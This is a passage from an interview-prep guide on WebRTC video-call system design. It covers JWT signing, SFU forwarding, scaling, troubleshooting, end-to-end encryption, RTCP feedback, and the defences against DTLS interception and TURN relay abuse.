**Answer:** HS256 uses a shared symmetric secret. Every service that verifies JWTs must have the secret, meaning any compromised service can forge tokens for any user. RS256 uses an RSA key pair: the auth service signs with the private key (never shared), every verifying service uses only the public key. A compromised API service cannot forge tokens. The public key is exposed at the auth service's JWKS endpoint (`/.well-known/jwks.json`), a JSON document containing the RSA public key in JWK format (modulus, exponent, key ID). Services fetch this endpoint on startup and cache it, periodically refreshing. The `kid` (key ID) in the JWT header tells verifiers which key to use — enabling key rotation without downtime: issue new tokens with `kid:v2`, old tokens with `kid:v1` continue to be valid until expiry, then retire the v1 key from JWKS.

**What if:** "What if JWKS endpoint is down?" Services should cache the JWKS locally with a long TTL (e.g., 24 hours) and continue serving from cache while retrying refresh. This avoids a cascading failure where JWKS downtime causes all authentication to fail.

---

### Q5: The SFU needs to forward video from Alice to 500 simultaneous viewers. Walk through the exact packet journey.

**Answer:** Alice's browser encodes video at, say, 3 spatial layers (simulcast: 1080p / 480p / 180p). Her WebRTC engine generates 3 RTP streams, each with a different SSRC. All 3 streams are sent over her DTLS-SRTP connection to the SFU's ICE-nominated endpoint. The SFU's ingress network stack receives the UDP packets, decrypts them with SRTP (using the DTLS-derived keys from Alice's session), and parses the RTP header to extract SSRC, sequence number, timestamp. The SFU's routing table maps Alice's SSRC to her room. For each of the 500 viewers, the SFU checks the viewer's current bandwidth capacity (from REMB or transport-cc RTCP feedback) and selects the appropriate spatial layer. It re-encrypts the RTP packet (potentially rewriting the SSRC and possibly the sequence number to match each viewer's expected stream) with that viewer's SRTP context (from their DTLS session). It then sends the packet out via the viewer's ICE-nominated UDP endpoint. This means one incoming Alice packet may be sent to 500 destinations — the SFU is doing 500 SRTP encryptions per packet. At 30fps 1080p Alice = ~150 packets/second, 500 viewers = 75,000 outgoing packets/second just for Alice's video. This is why SFU network throughput is the primary scaling bottleneck.

---

### Q6: How would you design the system to handle 1 million simultaneous calls with no single point of failure?

**Answer (key points):**

**Signaling:** Stateless where possible via event-driven design. WebSocket servers use Redis Pub/Sub for cross-node routing. Redis Cluster (3 primaries, 3 replicas) for HA. Signaling nodes behind a Layer 4 load balancer with session affinity (consistent hashing on user ID). If a signaling node dies, affected connections reconnect (exponential backoff) to another node. Presence state in Redis auto-expires via TTL.

**TURN/STUN:** DNS-based geo-load balancing (Anycast or GeoDNS). TURN servers are stateful but sessions are independent — node failure only affects active calls through that TURN server (they fall back to other TURN servers via ICE restart). 1M calls × 30% needing TURN × 2 Mbps = 600 Gbps of TURN bandwidth — needs many servers globally.

**SFU:** Room-to-SFU consistent hashing. Each SFU handles a subset of rooms. Room creation registers in a distributed registry (etcd or Consul). If an SFU node fails, affected rooms must be migrated (ICE restart for all participants) — this is a hard problem. Mitigation: oversized SFU fleet so each handles 70% capacity (headroom for failures).

**Database:** PostgreSQL with read replicas and PgBouncer. For 1M calls, writes are high (join/leave events) — consider event sourcing into Kafka with PostgreSQL as eventual read model, not the write target.

**Tradeoffs:** Consistency in presence state is loosened (eventually consistent is fine — if a participant appears offline for 100ms during a Redis failover, that's acceptable). Stronger consistency is required for billing records (must not lose call duration data).

---

### Q7: A user reports their video froze during a call but audio continued. Diagnose this using only observability data.

**Answer:**

Step 1: Pull the WebRTC stats from the client at the time of the freeze. `RTCInboundRtpStreamStats` for the video track: check `framesDecoded`, `framesDropped`, `packetsLost`, `jitter`, `freezeCount`, `totalFreezesDuration`.

Step 2: If `packetsLost` spiked at freeze time → network-level packet loss. Check if audio SSRC also had loss (if audio was fine, maybe the loss was selective — QoS marking or router prioritizing audio? Or maybe video packets are larger and more likely to be dropped at a congested link).

Step 3: If `packetsLost` is low but `framesDecoded` stopped → decoder failure. Check `decoderImplementation` — if it was using hardware decoder, it may have encountered a malformed frame, crashed, and fallen back to software (or just failed).

Step 4: Check `jitter` — if jitter spiked, the jitter buffer may have underflowed (delay grew so large that buffer emptied before new packets arrived), causing a freeze until the buffer refilled.

Step 5: Check SFU metrics at the same timestamp. Did the SFU experience packet loss on its uplink to Alice? Did Alice's simulcast layer selection change (downgrade to low resolution, then SFU had no packets to forward if the low-res stream also had issues)?

Step 6: Check network interface metrics on the SFU pod — was there a brief saturation event (ingress rate spike) that caused kernel packet drops?

**Why this matters in an interview:** It demonstrates you understand the full stack from browser WebRTC stats → SFU → network, not just theory.

---

### Q8: What happens to an in-progress call when the signaling server restarts?

**Answer:** The signaling server's restart affects the WebSocket connections, not the media path. If the signaling server pod restarts:

1. All WebSocket connections to that pod are immediately closed (TCP RST).

2. Clients receive a `close` event on their WebSocket. Well-behaved clients implement reconnection with exponential backoff (e.g., 1s, 2s, 4s, 8s, up to 30s).

3. Media (RTP/SRTP) is unaffected — it flows directly between peers (P2P) or through the SFU, bypassing the signaling server entirely. The call continues.

4. After reconnection, the client re-authenticates its WebSocket (sends JWT in upgrade request or as first message). The signaling server may have lost in-memory state for that connection — the room state is in Redis, so it can be reconstructed.

5. If re-negotiation is needed (e.g., a new participant tries to join while the client's signaling connection was down), the client may miss the offer. Mitigation: queue missed signaling messages in Redis for a short window (30 seconds) and deliver on reconnect.

**What if:** "What if Redis also restarts?" Signaling server cannot look up Bob's node. Messages to Bob fail silently. The call degrades (no new participants can join, no in-call messages via signaling), but existing media continues until the call naturally ends or participants manually hang up. Redis Sentinel's failover time (~15-30s) is the window of degradation.

---

### Q9: Describe a scenario where SRTP alone does not protect a call. What additional mechanism is needed and why?

**Answer:** SRTP alone does not authenticate the key exchange — it only encrypts and authenticates media after keys are established. If the key exchange (DTLS) is compromised, SRTP provides no protection. Specifically: if an attacker can perform a MITM at the UDP layer, intercept the DTLS handshake, and present their own certificate to each peer, the peers will establish SRTP sessions with the attacker, not with each other. The attacker decrypts, potentially modifies, and re-encrypts the media. This is why the SDP fingerprint mechanism exists: the fingerprint of each side's DTLS certificate is exchanged in SDP (over the signaling channel, which is protected by TLS). Each side verifies that the certificate presented in the DTLS handshake matches the fingerprint in the SDP. If the signaling channel is also compromised (MITM on TLS — which requires a CA compromise or installed root cert on the client), the attacker can substitute their fingerprint in the SDP too, breaking the chain. The remaining defense is certificate transparency (CT logs) — all publicly-trusted TLS certificates are logged and can be audited — and HPKP (now deprecated) or Expect-CT. The lesson: WebRTC security is a chain. Break TLS → break fingerprint exchange → break DTLS authentication → break SRTP key integrity → media is compromised.

---

### Q10: How would you implement end-to-end encryption for group calls where the server cannot decrypt media?

**Answer:** Standard WebRTC with an SFU is NOT end-to-end encrypted — the SFU can decrypt SRTP (it holds the DTLS session keys). True E2EE for group calls requires a different approach:

**Insertable Streams / WebRTC Encoded Transform (W3C spec):** The browser's WebRTC engine exposes encoded (but not yet encrypted for transport) media frames as JavaScript streams. You can insert a JS transform step that applies an additional encryption layer (e.g., AES-GCM with a group key) before the WebRTC engine encrypts for SRTP transport. On the receiver side, you decrypt the inner layer after SRTP decryption, before rendering.

**Key management for group E2EE:**
- Each participant generates a signing key pair
- A group key is established via MLS (Messaging Layer Security, RFC 9420) — a tree-based key agreement protocol that scales to thousands of participants
- MLS provides forward secrecy (new key per epoch when membership changes) and break-in recovery (keys are periodically refreshed even without membership changes)
- When Bob leaves the call, a new epoch begins with a new group key that Bob cannot derive. Old media is still protected by the previous key that Bob had — true PFS requires the additional step of all remaining participants re-encrypting any stored content.

**SFU's role in E2EE:** The SFU still sees SRTP-encrypted packets (transport layer) and forwards them. It cannot decrypt the inner E2EE layer (application layer). The SFU can still do simulcast selection based on RTP headers (which are not E2EE protected) or on bandwidth signals, but cannot read or modify the video content. This is the architecture used by Signal's group calls and WhatsApp video calls.

---

### Q11: What is the difference between NACK, PLI, and FIR in WebRTC, and when does each trigger?

**Answer:** All three are RTCP feedback messages from receiver to sender, but they address different failure modes:

**NACK (Negative Acknowledgement, RFC 4585):** The receiver detects a gap in the RTP sequence numbers. It sends an RTCP NACK with the specific sequence numbers that are missing. The sender re-transmits those RTP packets (using the RTX payload type if configured). NACK is efficient for recovering from mild packet loss (1-3 packets). It works because: (1) the missing packet is likely still in the sender's retransmit buffer, (2) the RTT is short enough that retransmit arrives before the decoder gives up. NACK fails at high loss rates (every packet triggers NACK) or high RTT (packet arrives too late to decode).

**PLI (Picture Loss Indication):** The receiver's video decoder encounters a frame it cannot decode (due to missing reference frames, corruption, or prolonged loss). It sends a PLI, requesting the sender to generate a full intra-coded frame (I-frame / keyframe) — a frame that does not depend on any previous frame. The sender responds by encoding an I-frame. This is expensive: I-frames are 5-10× larger than predicted frames (P-frames). They cause a brief bitrate spike and may also cause a visual artifact (freeze then jump). PLI is a "sledgehammer" — use only when NACK cannot recover the reference frames.

**FIR (Full Intra Request, RFC 5104):** Functionally similar to PLI but intended for multicast/SFU scenarios. FIR includes a sequence number so the sender knows it's a new request (not a duplicate). The SFU sends FIR when a new participant joins a room and needs a keyframe to start decoding Alice's video from scratch — without having to wait for the natural keyframe interval. PLI is sent when something went wrong; FIR is sent proactively when a new subscriber needs a reference point. In practice, many implementations treat them identically.

---

### Q12: Your TURN server is being used as a DDoS amplification vector. Walk through exactly how this works and how you stop it.

**Answer:**

**How the amplification works:** TURN's ALLOCATE request is authenticated (HMAC), but the DATA INDICATION mechanism allows an authenticated user to send UDP data to any IP:port via the TURN relay. An attacker with a valid credential sends TURN `Send Indication` packets to the relay, with the XOR-PEER-ADDRESS set to the target's IP and the DATA attribute containing the payload to send. The TURN server faithfully forwards this as a UDP packet from its own IP to the target. If the attacker sends a 100-byte UDP packet and the TURN server sends a 1000-byte packet (due to headers + forwarding of attacker's full payload), there's a 10× amplification — though in practice amplification factor is low because the TURN server sends exactly what it receives.

**The more serious issue:** TURN allows an authenticated attacker to use the TURN server as a source IP for UDP attacks, hiding their real source IP. The target sees traffic from the TURN server's IP, not the attacker's.

**Stopping it:**

1. **Peer address filtering:** TURN servers should reject ALLOCATE/Send requests targeting RFC 1918 (private), loopback, multicast, and any other non-routable addresses. Also consider blocking your own infrastructure IPs.

2. **Bandwidth limits per credential:** Hard cap total bytes sent per allocation per second. Attacker exceeding cap gets their allocation killed.

3. **Connection rate limiting:** Limit how fast a single credential can create new allocations (e.g., 10/minute).

4. **Credential scope enforcement:** Bind credentials to specific peer IP ranges if your use case permits (e.g., only allow TURN relay to specific CDN ranges — but this breaks general-purpose use).

5. **Short credential TTL:** 5-minute TTL means even a stolen credential is usable for only 5 minutes.

6. **Monitoring:** Alert when any single TURN allocation exceeds N MB of bandwidth or Y packets/second. Automated kill of the allocation and ban of the credential.

7. **Logging:** Log all TURN peer addresses with timestamps and credential IDs. This creates forensic evidence even if you can't stop attacks in real time.

---

*Document ends. Total coverage: signaling, media, ICE/NAT, authentication, authorization, data flow, encryption, 6 attack scenarios, failure modes, mitigations, observability, scaling, and 12 interview questions.*
